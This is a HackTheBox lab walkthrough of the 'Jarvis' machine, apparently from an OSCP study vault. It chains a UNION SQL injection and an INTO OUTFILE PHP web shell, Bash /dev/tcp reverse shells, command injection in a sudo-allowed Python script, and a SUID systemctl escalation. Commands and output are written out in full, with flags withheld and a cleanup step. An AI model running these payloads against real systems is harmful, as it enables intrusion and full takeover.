---
tags: [HTB, Jarvis, Linux, Apache, SQLi, CommandInjection, SUID, Systemctl, Medium]
platform: HackTheBox
os: Linux
hostname: jarvis
domain: None
difficulty: Medium
ip: $BoxIP
status: Complete
---

# HTB: Jarvis, Full Walkthrough

## The gist

Jarvis runs an Apache-hosted Stark Hotel application with a numeric SQL injection in the room lookup parameter. Manual UNION extraction showed that MariaDB could write a PHP command shell into the web root, giving a www-data foothold. That account could run a vulnerable ping utility as pepper, whose command injection led to a shell as pepper. A root-owned SUID systemctl was then abused through SYSTEMD_EDITOR to create a SUID Bash binary and obtain root.

## Box information

| Field | Value |
|---|---|
| Platform | HackTheBox |
| OS | Linux, Debian |
| Hostname | jarvis |
| Domain | None |
| Difficulty | Medium |
| IP | $BoxIP |

## Variables

~~~bash
boxset BoxName Jarvis
boxset BoxIP $BoxIP
boxset LocalIP $LocalIP
boxset BoxDir /home/kali/Platforms/HackTheBox/$BoxName
boxset Domain ''
boxset WebPort 80
boxset Port 4444
boxset Username www-data
boxset Username2 pepper
~~~

No passwords, hashes, or flag values are stored in this write-up.

## 1. Workspace setup

I started with the Kali helper so the box directory, variables, loot folders, screenshot folder, and session log were available before reconnaissance. htblog captured terminal output as well as commands, preserving callbacks, errors, and failed attempts for review.

~~~bash
source ~/.zshrc
boxstart $BoxName $BoxIP htb
htblog
boxset BoxName Jarvis
boxset BoxIP $BoxIP
boxset LocalIP $LocalIP
boxset BoxDir /home/kali/Platforms/HackTheBox/$BoxName
boxset WebPort 80
boxset Port 4444
~~~

![[0.boxstart.png]]
SCREENSHOT: Box workspace initialisation and captured session.


## 2. Full TCP scan

A full TCP scan prevents a non-standard service from being missed. -Pn skips ICMP discovery, -n avoids DNS lookups, -sT uses a TCP connect scan when raw SYN sockets are unavailable, and -p- checks every TCP port. -oA saves normal, grepable, and XML results for later reference.

~~~bash
sudo nmap -sT -Pn -n -p- --min-rate 10000 "$BoxIP" -oA "$BoxDir/nmap/${BoxName}_allports"
~~~

The scan found SSH, the main web service, and a second HTTP service:

~~~text
22/tcp     open  ssh
80/tcp     open  http
64999/tcp  open  unknown
~~~

![[1.nmap-allports.png]]
SCREENSHOT: Full TCP scan showing ports 22, 80, and 64999.

## 3. Service and version scan

The focused scan identifies product versions and runs Nmap's standard scripts. -sC gathers default-script details such as HTTP titles and SSH host keys, while -sV performs service version detection. Limiting the scan to discovered ports keeps the output focused.

~~~bash
nmap -sT -Pn -sC -sV -p 22,80,64999 "$BoxIP" -oA "$BoxDir/nmap/${BoxName}_services"
~~~

The important results were Apache 2.4.25 on Debian and the Stark Hotel title on port 80. Port 64999 also served Apache but had no useful title.

~~~text
22/tcp     open  ssh   OpenSSH 7.4p1 Debian 10+deb9u6
80/tcp     open  http  Apache httpd 2.4.25 ((Debian))
|_http-title: Stark Hotel
64999/tcp  open  http  Apache httpd 2.4.25 ((Debian))
|_http-title: Site doesn't have a title
Service Info: OS: Linux
~~~

![[2.nmap-svcscan.png]]
SCREENSHOT: Focused service scan showing SSH, Apache, and the Stark Hotel title.

## 4. Web reconnaissance and WAF behaviour

The main page should be read before broad content discovery because source code and links often reveal the intended route. The response exposed supersecurehotel.htb, the Stark Hotel application, and an IronWAF header. Repeated or aggressive requests caused a 90-second ban, so enumeration stayed manual and low-rate.

~~~bash
curl -i --max-time 15 "http://$BoxIP/" | tee "$BoxDir/loot/http_root_full.txt"
curl -i --max-time 15 "http://$BoxIP:64999/" | tee "$BoxDir/loot/http_64999_full.txt"
~~~

The main response identified Apache, IronWAF 2.0.3, and Stark Hotel. Port 64999 returned the WAF message instead of a second application. The room listing then supplied room.php?cod=1 through room.php?cod=6, making cod the first parameter to test.

~~~bash
curl -sS --max-time 15 "http://$BoxIP/rooms-suites.php" | tee "$BoxDir/loot/rooms-suites-full.html" >/dev/null
grep -nEi 'room.php|cod=' "$BoxDir/loot/rooms-suites-full.html" | head -10
~~~

I did not continue with a high-thread Gobuster run after the ban response because the relevant route was already exposed and additional requests risked another delay.

> [!tip] ⚡ Efficiency
> Following the room links in the saved HTML was faster and quieter than brute-forcing the entire site after the WAF had already demonstrated its request threshold.

![[3.http-recon.png]]
SCREENSHOT: Stark Hotel response and source showing the hostname and application. Red = hostname and application; green = response context.

![[5.port64999-ironWAF.png]]
SCREENSHOT: Port 64999 returning the IronWAF ban response. Red = ban message; green = HTTP and WAF headers.

## 5. Confirm the numeric SQL injection

The room parameter is numeric, so a boolean false condition should return no room. --data-urlencode preserves spaces and SQL punctuation, while -G places the encoded value in the query string. A 200 status alone is not proof, so I compared the returned room fields with a normal request.

~~~bash
curl -sS --max-time 15 -D - -o "$BoxDir/loot/room_cod_false.html" "http://$BoxIP/room.php?cod=1%20AND%201=2"
grep -nE 'room.php|price-room' "$BoxDir/loot/room_cod_false.html" | head -5
~~~

The false condition returned empty room fields, including an empty room link and price, while the normal numeric value returned a populated room. This confirmed that the parameter was being evaluated in the database query.

![[6.cod=-integer-param-db.png]]
SCREENSHOT: Normal numeric cod request identifying the database-backed parameter. Red = room.php and cod; green = normal populated response.

![[7.sqli-room-cod-false.png]]
SCREENSHOT: False boolean condition changing the room response. Red = empty room fields; green = the submitted false condition.

## 6. Map UNION columns and enumerate MariaDB

UNION extraction requires the same number of columns as the original query. I submitted seven numbered values and observed where they appeared in the HTML. The second value rendered as the room name, the third as the price, the fourth as the description, the fifth as the star rating, and the sixth as the image path, so column two was the visible extraction column.

~~~bash
curl -sS --max-time 15 -G "http://$BoxIP/room.php" --data-urlencode "cod=-1 UNION SELECT 1,2,3,4,5,6,7-- -" -o "$BoxDir/loot/room_union7_false.html"
sed -n '104,118p' "$BoxDir/loot/room_union7_false.html"
~~~

The seven-column UNION was accepted:

~~~text
<h3><a href="/room.php?cod=1">2</a></h3>
<span class="price-room">3</span>
<p>4</p>
~~~

I then queried the database version, current schema, tables, and columns. information_schema is MariaDB's metadata database, and GROUP_CONCAT combines multiple names into one visible value.

~~~bash
curl -sS -G "http://$BoxIP/room.php" --data-urlencode "cod=-1 UNION SELECT 1,@@version,3,4,5,6,7-- -" | grep -nE '<h3>'
curl -sS -G "http://$BoxIP/room.php" --data-urlencode "cod=-1 UNION SELECT 1,database(),3,4,5,6,7-- -" | grep -nE '<h3>'
curl -sS -G "http://$BoxIP/room.php" --data-urlencode "cod=-1 UNION SELECT 1,GROUP_CONCAT(table_name),3,4,5,6,7 FROM information_schema.tables WHERE table_schema=database()-- -" | grep -nE '<h3>'
curl -sS -G "http://$BoxIP/room.php" --data-urlencode "cod=-1 UNION SELECT 1,GROUP_CONCAT(column_name),3,4,5,6,7 FROM information_schema.columns WHERE table_schema=database() AND table_name='room'-- -" | grep -nE '<h3>'
~~~

The results identified MariaDB, the hotel database, the room table, and the columns cod, name, price, descrip, star, image, and mini. A user() query identified DBadmin@localhost as the database execution account. secure_file_priv was empty, so a server-side file write was worth testing.

![[8.sqli-union-columns.png]]
SCREENSHOT: Seven-column UNION mapping with visible output. Red = visible column mapping; green = the surrounding HTML template.

![[9.database-enum.png]]
SCREENSHOT: MariaDB version, schema, table, and column enumeration. Red = extracted metadata; green = the UNION request context.

## 7. Write a PHP command shell with INTO OUTFILE

MariaDB INTO OUTFILE writes query output to a server-side path when the database account has FILE privilege and the destination is writable. I used a negative room identifier so the original query returned no normal row, then placed PHP code in the visible name column. The hex form avoids quote and punctuation problems inside nested SQL and URL syntax.

~~~bash
curl -sS -G "http://$BoxIP/room.php" --data-urlencode "cod=-1 UNION SELECT 1,0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e,3,4,5,6,7 INTO OUTFILE '/var/www/html/shell.php'-- -" -o "$BoxDir/loot/sqli_outfile.html"
~~~

The hex decodes to:

~~~php
<?php system($_GET["cmd"]); ?>
~~~

I verified execution with the harmless id command before attempting a callback.

~~~bash
curl -sS -G "http://$BoxIP/shell.php" --data-urlencode "cmd=id" | tee "$BoxDir/loot/shell_id.txt"
~~~

The response showed execution as www-data.

![[10.foothold.png]]
SCREENSHOT: PHP shell responding to id as www-data. Red = uid and account; green = the web-shell response.


## 8. Catch and stabilise the web-shell callback

A reverse shell connects from the target back to Kali, so the listener must be ready before the HTTP request launches Bash. /dev/tcp is Bash-specific syntax; bash -c ensures the command is interpreted by Bash. The HTTP request may time out after the callback takes over because the PHP process remains attached to the shell.

~~~bash
boxset Port 4444
nc -lvnp $Port
~~~

From a second terminal, I sent the callback through the confirmed PHP command parameter:

~~~bash
curl -sS --max-time 15 -G "http://$BoxIP/shell.php" --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/$LocalIP/$Port 0>&1'" -o "$BoxDir/loot/www_callback_trigger.txt"
~~~

A raw netcat shell has no pseudo-terminal, so job control and full-screen tools do not behave normally. Python's pty module creates a pseudo-terminal, stty raw -echo; fg restores the suspended connection with local echo disabled, and TERM tells terminal programs which capabilities are available.

~~~bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Press Ctrl+Z in the listener terminal
stty raw -echo; fg
export TERM=xterm
whoami
id
hostname
pwd
~~~

The stable foothold was www-data on jarvis in /var/www/html.

![[11.revshell-req.png]]
SCREENSHOT: Callback request and listener connection. Red = callback connection; green = listener context.

![[12.revshell-stable-foothold.png]]
SCREENSHOT: Stabilised www-data shell. Red = shell identity; green = hostname and working-directory context.

## 9. Discover the sudo transition

With a usable shell, I checked the current account's sudo policy before broad local enumeration. sudo -l lists permitted commands and shows whether a password is required. The result gave www-data a passwordless transition to pepper through one fixed Python script.

~~~bash
sudo -l
ls -l /var/www/Admin-Utilities/simpler.py
~~~

Relevant output:

~~~text
User www-data may run the following commands on jarvis:
    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
-rwxr--r-- 1 pepper pepper ... /var/www/Admin-Utilities/simpler.py
~~~

The script was readable, so I inspected its source rather than treating the sudo rule as a black box.

~~~bash
sed -n '1,220p' /var/www/Admin-Utilities/simpler.py
~~~

![[13.privesc-finding.png]]
SCREENSHOT: Passwordless sudo rule allowing www-data to run simpler.py as pepper. Red = NOPASSWD rule; green = command and account context.

## 10. Exploit command injection in simpler.py

The -p option reads an attacker-controlled IP and passes it to os.system() after prepending ping. The blacklist removes common separators such as &, ;, backticks, and pipes, but it does not remove command substitution. A $(...) expression is evaluated by the shell while the ping command is built, providing code execution without a blocked separator.

The vulnerable function was:

~~~python
def exec_ping():
    forbidden = ['&', ';', '-', '`', '||', '|']
    command = input('Enter an IP: ')
    for i in forbidden:
        if i in command:
            print('Got you')
            exit()
    os.system('ping ' + command)
~~~

I staged a Bash callback as www-data, then supplied 127.0.0.1$(bash /tmp/rev.sh) to the script. The backslash before the command substitution is important because it prevents the local shell from evaluating it before the request reaches the target.

~~~bash
boxset Username2 pepper
boxset Port 4445
curl -sS -G "http://$BoxIP/shell.php" --data-urlencode "cmd=printf '%s\\n' 'bash -i >& /dev/tcp/$LocalIP/$Port 0>&1' > /tmp/rev.sh; chmod +x /tmp/rev.sh" -o "$BoxDir/loot/stage_rev_shell.txt"
nc -lvnp $Port
~~~

From a second terminal, I triggered the vulnerable script:

~~~bash
curl -sS --max-time 10 -G "http://$BoxIP/shell.php" --data-urlencode "cmd=printf '%s\\n' '127.0.0.1\$(bash /tmp/rev.sh)' | sudo -u $Username2 /var/www/Admin-Utilities/simpler.py -p" -o "$BoxDir/loot/pepper_callback_trigger.txt" &
~~~

The callback arrived as pepper.

> [!warning] 💡 Gotcha
> A callback request normally times out after the remote shell takes over. If the listener terminal is suspended while upgrading the raw shell, restage the callback, keep the listener open, and launch the final HTTP trigger in the background.

![[14.vulnerable-function.png]]
SCREENSHOT: exec_ping() showing the incomplete blacklist and unsafe os.system() call. Red = unsafe concatenation; green = the filtering context.

![[15.privesc-finding.png]]
SCREENSHOT: Command-injection input and the pepper callback. Red = injected command and callback account; green = listener context.


## 11. Enumerate SUID programs as pepper

After changing users, I repeated identity checks and searched for SUID files. SUID means a program runs with the file owner's effective permissions, so a root-owned SUID administrative binary is a high-priority candidate. The -printf format records mode, owner, and path in one line, while 2>/dev/null suppresses permission errors.

~~~bash
id
whoami
hostname
find / -type f -perm -4000 -printf '%m %u %p\\n' 2>/dev/null | sort -n
~~~

The unusual result was:

~~~text
4750 root /bin/systemctl
~~~

![[16.foothold.png]]
SCREENSHOT: pepper shell identity after the sudo-script pivot. Red = account identity; green = host context.

![[17.privesc-finding.png]]
SCREENSHOT: SUID enumeration highlighting root-owned systemctl. Red = 4750 root-owned binary; green = surrounding SUID results.

## 12. Use the SUID systemctl editor path

The usual temporary-unit technique writes a service file and calls systemctl link followed by systemctl enable --now. On this older systemd build that route failed with a missing-file error, so I used the editor path instead. systemctl edit creates a temporary override and launches an editor. Because the SUID systemctl retains effective root privileges, SYSTEMD_EDITOR can point to a controlled script that runs as root.

The failed service-unit attempt was:

~~~bash
printf '%s\\n' '[Unit]' 'Description=Jarvis study service' '[Service]' 'Type=oneshot' 'ExecStart=/bin/sh -c "cp /bin/bash /tmp/jarvis-bash; chmod 4755 /tmp/jarvis-bash"' '[Install]' 'WantedBy=multi-user.target' > /tmp/jarvis-root.service
systemctl link /tmp/jarvis-root.service
systemctl enable --now /tmp/jarvis-root.service
~~~

The host returned:

~~~text
Failed to link unit: No such file or directory
Failed to enable unit: File /tmp/jarvis-root.service: No such file or directory
~~~

The working editor script copies Bash to a temporary path and applies the SUID bit. script -qc supplies a pseudo-terminal for systemctl edit, while /dev/null provides empty editor input.

~~~bash
printf '%s\\n' '#!/bin/sh' 'cp /bin/bash /tmp/jarvis-bash' 'chmod 4755 /tmp/jarvis-bash' > /tmp/jarvis-editor.sh
chmod +x /tmp/jarvis-editor.sh
script -qc 'SYSTEMD_EDITOR=/tmp/jarvis-editor.sh systemctl edit basic.target' /dev/null 2>&1
ls -l /tmp/jarvis-bash
~~~

The command reported that editing override.conf was canceled because the temporary file was empty, but the editor script had already executed. The resulting file was root-owned and SUID:

~~~text
-rwsr-xr-x 1 root pepper ... /tmp/jarvis-bash
~~~

Run Bash with -p so it preserves the effective UID instead of dropping the SUID privilege.

~~~bash
/tmp/jarvis-bash -p -c 'id; whoami; hostname'
~~~

The result showed euid=0, root, and hostname jarvis.

![[18.privesc-exploit.png]]
SCREENSHOT: SYSTEMD_EDITOR execution and SUID Bash creation. Red = editor path and SUID helper; green = systemctl output.

![[19.root-shell.png]]
SCREENSHOT: Root identity confirmed through the SUID Bash helper. Red = euid 0 and root; green = hostname context.

## 13. Confirm flags privately

The proof files were checked from the root-capable Bash helper. I recorded only that each file was present and non-empty; their contents were not displayed in this write-up.

~~~bash
/tmp/jarvis-bash -p -c 'test -s /home/pepper/user.txt && echo user_flag_present; test -s /root/root.txt && echo root_flag_present'
~~~

~~~text
user_flag_present
root_flag_present
~~~

![[20.flags.png]]
SCREENSHOT: User and root proof checks with values hidden. Red = presence checks; green = the root-capable shell context.

## 14. Clean-down and verification

Cleanup removes the web shell, staged reverse-shell scripts, SUID Bash helper, and temporary systemd override. The final HTTP request confirms that the web root no longer serves the PHP command shell.

~~~bash
/tmp/jarvis-bash -p -c 'rm -f /var/www/html/shell.php /tmp/rev.sh /tmp/jarvis-root.service /tmp/jarvis-editor.sh /tmp/jarvis-bash /etc/systemd/system/jarvis-root.service /etc/systemd/system/basic.target.d/override.conf; rmdir /etc/systemd/system/basic.target.d 2>/dev/null || true'
curl -sS --max-time 10 -o /dev/null -w 'shell.php status=%{http_code}\\n' "http://$BoxIP/shell.php"
boxdone
~~~

The endpoint returned 404, confirming that the web shell was removed. The local transcript and loot were retained in $BoxDir before boxdone cleared the active marker.

![[21.proof-shot.png]]
SCREENSHOT: Root proof and final verification without exposing flag contents. Red = proof state; green = identity context.

![[22.cleandown.png]]
SCREENSHOT: Target-side payload cleanup and final 404 verification. Red = cleanup result and 404; green = command context.


## RUNBOOK V2 Stages Used

- [[RUNBOOK V2/Start Here|Step 1 - Start Here]]
- [[RUNBOOK V2/Port Triage|Step 2 - Port Triage]]
- [[RUNBOOK V2/Linux - Service Scan|Step 3 - Linux Service Scan]]
- [[RUNBOOK V2/Linux - Web Enum|Step 5 - Linux Web Enum]]
- [[RUNBOOK V2/Linux - SQLi|Step 8 - Linux SQLi]]
- [[RUNBOOK V2/Linux - RCE to Shell|Step 11 - Linux RCE to Shell]]
- [[RUNBOOK V2/Linux - Shell Stabilise|Step 12 - Linux Shell Stabilise]]
- [[RUNBOOK V2/Linux - Local Enum|Step 13 - Linux Local Enum]]
- [[RUNBOOK V2/Linux - Sudo Check|Step 14 - Linux Sudo Check]]
- [[RUNBOOK V2/Linux - Command Injection|Step 8A - Linux Command Injection]]
- [[RUNBOOK V2/Linux - SUID Check|Step 15 - Linux SUID Check]]
- [[RUNBOOK V2/Linux - Clean Down|Step 21 - Linux Clean Down]]

## Attack Chain

1. Full TCP reconnaissance identified SSH, Apache, and the non-standard HTTP service.
2. Stark Hotel room links exposed the numeric cod parameter, and a false boolean condition confirmed SQL injection.
3. A seven-column UNION mapped visible fields and enumerated the MariaDB schema.
4. INTO OUTFILE wrote a PHP command shell into the Apache web root, producing a www-data foothold.
5. A passwordless sudo rule allowed www-data to run simpler.py as pepper.
6. exec_ping() passed untrusted input to os.system(), and command substitution produced the pepper shell.
7. SUID enumeration found root-owned /bin/systemctl.
8. The SUID editor path created a root-owned SUID Bash helper, which provided root execution with -p.
9. Proof files were confirmed privately and all target-side payloads were removed.

## Credentials

| Account | Source | Use |
|---|---|---|
| DBadmin@localhost | MariaDB user() output | Database execution context; no password recovered |
| www-data | PHP shell identity | Initial web-service foothold |
| pepper | Passwordless sudo rule for simpler.py | Second-stage shell and SUID enumeration |
| root | SUID systemctl editor path | Final privileged access |

No passwords or hashes were recovered or stored in this write-up.

## Flags

- user.txt: confirmed at /home/pepper/user.txt; value omitted
- root.txt: confirmed at /root/root.txt; value omitted
- proof.txt: not applicable to this box

## Key lessons

- A numeric parameter can still be UNION injectable; compare true and false responses instead of relying on error messages.
- INTO OUTFILE is a direct path from database access to PHP execution when the database account has FILE privilege and the web root is writable.
- A blacklist that omits shell syntax such as command substitution does not make os.system() safe.
- SUID enumeration should include unusual administrative binaries, not only common shells and file utilities.
- A systemctl editor escape can work even when the standard temporary-unit method fails on an older systemd version.

## Related Boxes

- [[OSCP/BOXES/WRITE UPS/Linux/Pebbles|Pebbles]] -- manual SQLi and MySQL INTO OUTFILE produced a web shell.
- [[OSCP/BOXES/WRITE UPS/Linux/Bashed|Bashed]] -- web command execution led to a sudo transition and SUID Bash.
- [[OSCP/BOXES/WRITE UPS/Linux/Nibbles|Nibbles]] -- a low-privilege Linux shell used a writable or missing sudo path to create a SUID Bash helper.
- [[OSCP/BOXES/WRITE UPS/Linux/OpenAdmin|OpenAdmin]] -- web command injection produced a Linux foothold followed by focused local escalation.

## External Resources

- [HackTricks -- SQL injection](https://book.hacktricks.xyz/pentesting-web/sql-injection)
- [GTFOBins -- systemctl](https://gtfobins.org/gtfobins/systemctl/)
- [RevShells](https://www.revshells.com/)

## Checklist

- [x] Context and write-up requirements read
- [x] Helper workspace initialised
- [x] Full TCP scan completed
- [x] Service versions identified
- [x] Stark Hotel web application enumerated
- [x] IronWAF behaviour recorded
- [x] Numeric SQL injection confirmed
- [x] UNION column count and visible fields mapped
- [x] MariaDB schema enumerated manually
- [x] PHP web shell written with INTO OUTFILE
- [x] www-data foothold confirmed
- [x] Sudo transition to pepper confirmed
- [x] simpler.py command injection confirmed
- [x] Root-owned SUID systemctl identified
- [x] Root shell obtained through SYSTEMD_EDITOR
- [x] User and root proof paths confirmed without displaying values
- [x] Target-side artifacts removed and web shell verified with 404
- [x] boxdone run

## Why this matters for OSCP

Jarvis combines three reusable OSCP habits: manually proving SQL injection before escalating it to code execution, reading the exact source behind a sudo-allowed script, and treating unusual SUID administrative binaries as privilege-escalation candidates. The WAF delay and failed systemd unit route also reinforce the value of low-noise enumeration and recording failure conditions instead of repeating a non-working path blindly.
